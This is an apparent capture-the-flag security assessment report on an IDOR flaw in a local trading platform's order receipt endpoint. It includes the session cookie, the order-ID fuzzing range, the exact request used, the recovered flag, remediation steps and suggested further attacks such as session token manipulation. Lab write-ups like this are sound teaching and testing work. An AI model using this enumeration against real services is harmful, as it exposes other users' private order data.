# Security Assessment Report: IDOR Vulnerability in Web Trading Platform

## TL;DR
- **Objective**: Identify IDOR vulnerabilities by fuzzing ID-like parameters on the order receipt endpoint
- **Outcome**: ACHIEVED - Confirmed horizontal IDOR vulnerability allowing unauthorized access to other users' receipt data
- **Highest-impact finding**: IDOR on `/order/{ORDER_ID}/receipt` exposing sensitive receipt data and FLAG token
- **Validation status**: **VALIDATED** - Successfully extracted FLAG token from unauthorized order access

## Target Information
- **Target**: 127.0.0.1:33027
- **Host / base URL**: http://127.0.0.1:33027
- **Application or component**: Web Trading Platform (order management system)
- **Authentication context**: Authenticated user session
  - Cookie: `session=eyJ1c2VyX2lkIjoxMDAzMn0.ac6`
  - User ID: 10032
  - Owned orders: 300123, 300214, 300327, 300481
- **Relevant technology details**: Standard web application with order/receipt endpoint accepting numeric order ID parameters

## Confirmed Vulnerability

### IDOR (Insecure Direct Object Reference) - Horizontal Privilege Escalation
- **Affected endpoint / component**: `GET /order/{ORDER_ID}/receipt`
- **Impact**: 
  - Unauthorized access to receipt data belonging to other users
  - Exposure of sensitive order information and FLAG tokens
  - Horizontal privilege escalation (accessing peer user data)
- **Preconditions**:
  - Valid authenticated session
  - Knowledge of or ability to guess order ID values
  - Order IDs are sequential/numeric (predictable)
- **Exact payload or PoC**:
  ```
  GET /order/300401/receipt HTTP/1.1
  Host: 127.0.0.1:33027
  Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.ac6
  ```

## Steps to Reproduce

1. **Authenticate** to the application and obtain a valid session cookie:
   ```
   Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.ac6
   ```

2. **Identify owned orders** (for baseline comparison):
   - User 10032 owns orders: 300123, 300214, 300327, 300481

3. **Fuzz order IDs** in the range 299000-301000 by sending requests to:
   ```
   GET http://127.0.0.1:33027/order/{ORDER_ID}/receipt
   ```
   
4. **Analyze responses** for unauthorized data exposure:
   - Detection strategy: Look for non-empty content in `<code class="text-white">` blocks
   - Empty/errored responses typically indicate inaccessible orders
   - Non-empty content indicates successful IDOR exploitation

5. **Confirm vulnerability** at order ID **300401**:
   - This order is NOT owned by the authenticated user
   - Receipt data exposes FLAG token: `FLAG{114d82be44233f043ec6dc69015345647e8da14230d836991f801f63483af312}`

## Validation / Evidence

- **Validation token / flag**: 
  ```
  FLAG{114d82be44233f043ec6dc69015345647e8da14230d836991f801f63483af312}
  ```

- **Tool evidence**: 
  - Script: `idor_fuzzer_single.py`
  - Fuzzed 2001 order IDs (range 299000-301000 inclusive)
  - Single-threaded execution due to sandboxed environment constraints
  - Detection via content analysis of `<code class="text-white">` blocks

- **Request evidence**:
  ```
  GET /order/300401/receipt HTTP/1.1
  Host: 127.0.0.1:33027
  Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.ac6
  ```

- **Response evidence**:
  ```
  [!] IDOR FOUND at order 300401
  [!] FLAG found: ['FLAG{114d82be44233f043ec6dc69015345647e8da14230d836991f801f63483af312}']
  Order ID: 300401
  Full content:
  FLAG{114d82be44233f043ec6dc69015345647e8da14230d836991f801f63483af312}
  ```

- **Proof of unauthorized access**:
  - Authenticated user owns orders: 300123, 300214, 300327, 300481
  - Target order 300401 is NOT in the user's owned order list
  - Access to order 300401 confirms horizontal privilege escalation

- **Notes on reliability / limitations**:
  - Fuzzing requires authenticated session
  - Order IDs are sequential numeric values (predictable)
  - Detection relied on HTML content analysis (`<code class="text-white">` blocks)
  - Single-threaded execution was necessary in sandboxed environment

## Remediation

- **Root cause**: 
  - The application fails to verify ownership/access control before serving receipt data
  - No authorization check ensures the requesting user owns the requested order ID
  - Sequential numeric order IDs make enumeration trivial

- **Recommended fix**:
  1. **Implement authorization checks**: Before serving receipt data, verify that the authenticated user's ID matches the owner of the requested order:
     ```
     if (current_user.id != order.owner_id):
         return 403 Forbidden
     ```
  2. **Use indirect object references**: Replace direct numeric order IDs with UUIDs or hashed values that are not guessable
  3. **Rate limiting**: Implement rate limiting on receipt endpoints to prevent mass ID enumeration

- **Defense-in-depth**:
  1. ** logging**: Log all access attempts to order receipts, flagging access to orders not owned by the requesting user
  2. **Monitoring**: Alert on patterns of sequential ID access (indicative of fuzzing)
  3. **API gateway policies**: Implement resource-level authorization at the API gateway layer

## How to Verify the Fix

1. **Attempt to access non-owned order**:
   ```
   curl -H "Cookie: session=VALID_SESSION" \
        http://127.0.0.1:33027/order/300401/receipt
   ```

2. **Expected secure result**:
   - HTTP 403 Forbidden response
   - No receipt data exposed
   - Generic error message (no information disclosure)

3. **Verify legitimate access still works**:
   ```
   curl -H "Cookie: session=VALID_SESSION" \
        http://127.0.0.1:33027/order/300123/receipt
   ```
   - Should return HTTP 200 with receipt data for owned order

## Remaining Leads

- **Confirmed blockers**: None - primary objective achieved

- **Unverified leads**:
  - [SUSPECTED] Mass Assignment via ID parameter manipulation: Requires testing with other HTTP methods (POST/PUT/PATCH) on order endpoints
  - [SUSPECTED] Information Disclosure through error messages: Requires forced error conditions to analyze error responses
  - [SUSPECTED] Session management vulnerabilities via user_id manipulation: Requires decoding and modifying session token structure

- **Missing context**:
  - Full HTTP response headers from successful exploitation
  - Complete response body structure beyond FLAG content
  - Session token encoding/structure analysis (for potential session manipulation attacks)
  - Whether rate limiting or throttling was encountered during fuzzing
